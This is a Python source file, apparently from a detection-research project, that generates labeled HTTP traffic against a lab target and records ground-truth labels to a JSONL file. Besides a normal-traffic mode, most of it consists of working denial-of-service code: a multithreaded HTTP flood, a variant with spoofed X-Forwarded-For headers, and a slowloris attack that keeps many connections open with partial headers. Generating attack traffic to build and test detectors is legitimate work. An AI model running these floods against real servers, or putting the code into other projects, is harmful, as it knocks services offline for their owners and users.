"""
simulator/traffic_generator.py

Generates HTTP traffic against a target — normal or attack mode.

Usage (CLI):
    python -m simulator.traffic_generator \\
        --target http://192.168.122.30:8080/ \\
        --mode normal --duration 15 --rps 3
"""
from __future__ import annotations

import argparse
import json
import random
import socket
import threading
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Literal

import requests
from requests.adapters import HTTPAdapter

from core.logging import get_logger

log = get_logger("simulator.traffic_generator")

Mode = Literal["normal", "http_flood", "spoofed", "slowloris"]

LABEL_DIR = Path("data/labeled")


# ---------------------------------------------------------------------------
# Ground-truth label
# ---------------------------------------------------------------------------
@dataclass
class TrafficLabel:
    ts_start: float
    ts_end: float
    mode: str
    target: str
    source_ip: str
    requests: int
    threads: int
    rps_target: float
    note: str = ""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def real_source_ip(target: str) -> str:
    try:
        host = target.split("//")[-1].split("/")[0].split(":")[0]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "unknown"


def make_session(pool: int = 100) -> requests.Session:
    s = requests.Session()
    adapter = HTTPAdapter(pool_connections=pool, pool_maxsize=pool, max_retries=0)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s


def write_label(label: TrafficLabel) -> None:
    LABEL_DIR.mkdir(parents=True, exist_ok=True)
    out = LABEL_DIR / "labels.jsonl"
    with out.open("a") as f:
        f.write(json.dumps(asdict(label)) + "\n")
    log.info(f"label written mode={label.mode} reqs={label.requests} ip={label.source_ip}")


# ---------------------------------------------------------------------------
# Traffic Generator
# ---------------------------------------------------------------------------
class TrafficGenerator:
    def __init__(
        self,
        target: str,
        timeout: float = 3.0,
        user_agents: list[str] | None = None,
        paths: list[str] | None = None,
    ) -> None:
        self.target = target.rstrip("/") + "/"
        self.timeout = timeout
        self.user_agents = user_agents or [
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            "curl/8.4.0",
            "python-requests/2.31.0",
        ]
        self.paths = paths or ["/", "/index.html", "/api/data", "/health"]

        self._lock = threading.Lock()
        self._sent = 0
        self._errors = 0
        self._stop = threading.Event()

    def _inc(self, ok: bool) -> None:
        with self._lock:
            self._sent += 1
            if not ok:
                self._errors += 1

    def snapshot(self) -> tuple[int, int]:
        with self._lock:
            return self._sent, self._errors

    def reset(self) -> None:
        with self._lock:
            self._sent = 0
            self._errors = 0

    def stop(self) -> None:
        self._stop.set()

    # --- normal ---
    def run_normal(self, duration: int = 30, rps: float = 5.0,
                   jitter: float = 0.3) -> TrafficLabel:
        log.info(f"[normal] target={self.target} rps={rps} dur={duration}s")
        self.reset()
        self._stop.clear()

        start = time.time()
        interval = 1.0 / max(rps, 0.001)
        session = make_session()

        while not self._stop.is_set() and (time.time() - start) < duration:
            try:
                path = random.choice(self.paths)
                headers = {"User-Agent": random.choice(self.user_agents)}
                r = session.get(self.target + path.lstrip("/"),
                                headers=headers, timeout=self.timeout)
                self._inc(r.status_code < 500)
            except Exception:
                self._inc(False)
            time.sleep(interval * (1 + random.uniform(-jitter, jitter)))

        sent, errs = self.snapshot()
        label = TrafficLabel(
            ts_start=start, ts_end=time.time(),
            mode="normal", target=self.target,
            source_ip=real_source_ip(self.target),
            requests=sent, threads=1, rps_target=rps,
            note=f"errors={errs}",
        )
        write_label(label)
        return label

    # --- http flood ---
    def run_http_flood(self, duration: int = 30, threads: int = 50,
                       spoof_xff: bool = False) -> TrafficLabel:
        log.info(f"[http_flood] threads={threads} dur={duration}s spoof_xff={spoof_xff}")
        self.reset()
        self._stop.clear()
        start = time.time()

        def worker(tid: int) -> None:
            session = make_session(pool=10)
            while not self._stop.is_set() and (time.time() - start) < duration:
                try:
                    headers = {"User-Agent": random.choice(self.user_agents)}
                    if spoof_xff:
                        headers["X-Forwarded-For"] = random_ip()
                    r = session.get(self.target, headers=headers, timeout=self.timeout)
                    self._inc(r.status_code < 500)
                except Exception:
                    self._inc(False)

        workers = [threading.Thread(target=worker, args=(i,), daemon=True)
                   for i in range(threads)]
        for w in workers:
            w.start()
        for w in workers:
            w.join(timeout=duration + 5)

        sent, errs = self.snapshot()
        label = TrafficLabel(
            ts_start=start, ts_end=time.time(),
            mode="http_flood", target=self.target,
            source_ip="spoofed" if spoof_xff else real_source_ip(self.target),
            requests=sent, threads=threads, rps_target=0.0,
            note=f"errors={errs} spoof_xff={spoof_xff}",
        )
        write_label(label)
        return label

    # --- slowloris ---
    def run_slowloris(self, duration: int = 60, connections: int = 200,
                      keepalive: float = 10.0) -> TrafficLabel:
        log.info(f"[slowloris] conns={connections} dur={duration}s")
        self.reset()
        self._stop.clear()

        host = self.target.split("//")[-1].split("/")[0]
        if ":" in host:
            hostname, port = host.split(":")
            port = int(port)
        else:
            hostname, port = host, 80

        start = time.time()
        sockets: list[socket.socket] = []

        def open_conn() -> socket.socket | None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((hostname, port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: " + hostname.encode() + b"\r\n")
                s.send(b"User-Agent: slowloris/1.0\r\n")
                self._inc(True)
                return s
            except Exception:
                self._inc(False)
                return None

        for _ in range(connections):
            s = open_conn()
            if s:
                sockets.append(s)

        while not self._stop.is_set() and (time.time() - start) < duration:
            for s in list(sockets):
                try:
                    s.send(b"X-Pad: " + b"a" * 10 + b"\r\n")
                    self._inc(True)
                except Exception:
                    self._inc(False)
                    sockets.remove(s)
                    ns = open_conn()
                    if ns:
                        sockets.append(ns)
            time.sleep(keepalive)

        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

        sent, errs = self.snapshot()
        label = TrafficLabel(
            ts_start=start, ts_end=time.time(),
            mode="slowloris", target=self.target,
            source_ip=real_source_ip(self.target),
            requests=sent, threads=len(sockets), rps_target=0.0,
            note=f"errors={errs} keepalive={keepalive}s",
        )
        write_label(label)
        return label


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="HTTP traffic simulator")
    p.add_argument("--target", required=True)
    p.add_argument("--mode", required=True,
                   choices=["normal", "http_flood", "spoofed", "slowloris"])
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--rps", type=float, default=5.0)
    p.add_argument("--threads", type=int, default=50)
    p.add_argument("--connections", type=int, default=200)
    p.add_argument("--keepalive", type=float, default=10.0)
    return p.parse_args()


def main() -> int:
    args = _parse_args()
    gen = TrafficGenerator(target=args.target)

    try:
        if args.mode == "normal":
            gen.run_normal(duration=args.duration, rps=args.rps)
        elif args.mode == "http_flood":
            gen.run_http_flood(duration=args.duration, threads=args.threads)
        elif args.mode == "spoofed":
            gen.run_http_flood(duration=args.duration, threads=args.threads,
                               spoof_xff=True)
        elif args.mode == "slowloris":
            gen.run_slowloris(duration=args.duration,
                              connections=args.connections,
                              keepalive=args.keepalive)
    except KeyboardInterrupt:
        log.info("interrupted by user")
        gen.stop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())